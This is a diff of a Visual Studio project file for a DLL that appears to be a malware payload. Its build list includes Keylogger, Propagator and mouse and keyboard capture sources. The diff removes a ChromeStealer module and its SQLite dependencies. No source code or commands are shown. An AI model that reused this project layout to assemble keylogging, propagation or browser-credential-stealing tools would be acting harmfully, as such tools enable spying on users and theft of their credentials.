@@ -90,13 +90,13 @@
       <PreprocessorDefinitions>WIN32;_DEBUG;_WINDOWS;_USRDLL;PAYLOAD_EXPORTS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <SDLCheck>true</SDLCheck>
       <AdditionalOptions>-D_WIN32_WINNT=0x0501 %(AdditionalOptions)</AdditionalOptions>
-      <AdditionalIncludeDirectories>C:\Libraries\SQLite\Include;C:\Libraries\OpenSSL\build\debug\include;C:\Github\Spider\client\spider\spider;C:\Libraries\Boost\boost_1_61_0;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <AdditionalIncludeDirectories>C:\Libraries\OpenSSL\build\debug\include;C:\Github\Spider\client\spider\spider;C:\Libraries\Boost\boost_1_61_0;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
     </ClCompile>
     <Link>
       <SubSystem>Windows</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
       <AdditionalLibraryDirectories>C:\Libraries\Boost\boost_1_61_0\stage\lib;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
-      <AdditionalDependencies>C:\Libraries\OpenSSL\build\debug\lib\libeay32.lib;C:\Libraries\OpenSSL\build\debug\lib\ssleay32.lib;C:\Libraries\SQLite\Debug\SQLite3.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalDependencies>C:\Libraries\OpenSSL\build\debug\lib\libeay32.lib;C:\Libraries\OpenSSL\build\debug\lib\ssleay32.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
@@ -124,7 +124,7 @@
       <PreprocessorDefinitions>WIN32;NDEBUG;_WINDOWS;_USRDLL;PAYLOAD_EXPORTS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <SDLCheck>true</SDLCheck>
       <AdditionalOptions>-D_WIN32_WINNT=0x0501 %(AdditionalOptions)</AdditionalOptions>
-      <AdditionalIncludeDirectories>C:\Libraries\SQLite\Include;C:\Libraries\OpenSSL\build\release\include;C:\Github\Spider\client\spider\spider;C:\Libraries\Boost\boost_1_61_0;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <AdditionalIncludeDirectories>C:\Libraries\OpenSSL\build\release\include;C:\Github\Spider\client\spider\spider;C:\Libraries\Boost\boost_1_61_0;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
     </ClCompile>
     <Link>
       <SubSystem>Windows</SubSystem>
@@ -158,35 +158,18 @@
     <ClCompile Include="..\..\spider\spider\InputKeyboard.cpp" />
     <ClCompile Include="..\..\spider\spider\InputMouse.cpp" />
     <ClCompile Include="..\..\spider\spider\StaticTools.cpp" />
-    <ClCompile Include="ChromeStealer.cpp">
-      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">false</ExcludedFromBuild>
-    </ClCompile>
-    <ClCompile Include="JSONBuilder.cpp" />
     <ClCompile Include="Keylogger.cpp" />
     <ClCompile Include="main.cpp" />
     <ClCompile Include="Payload.cpp" />
     <ClCompile Include="Propagator.cpp" />
-    <ClCompile Include="SQLite3.cpp">
-      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">false</ExcludedFromBuild>
-    </ClCompile>
   </ItemGroup>
   <ItemGroup>
-    <ClInclude Include="ChromeStealer.h">
-      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">false</ExcludedFromBuild>
-    </ClInclude>
     <ClInclude Include="IPayload.h" />
-    <ClInclude Include="IStealer.h">
-      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">false</ExcludedFromBuild>
-    </ClInclude>
-    <ClInclude Include="JSONBuilder.hpp" />
     <ClInclude Include="Keylogger.h" />
     <ClInclude Include="KeyState.h" />
     <ClInclude Include="MouseEvent.h" />
     <ClInclude Include="Payload.h" />
     <ClInclude Include="Propagator.h" />
-    <ClInclude Include="SQLite3.hpp">
-      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">false</ExcludedFromBuild>
-    </ClInclude>
     <ClInclude Include="Typedef.hpp" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
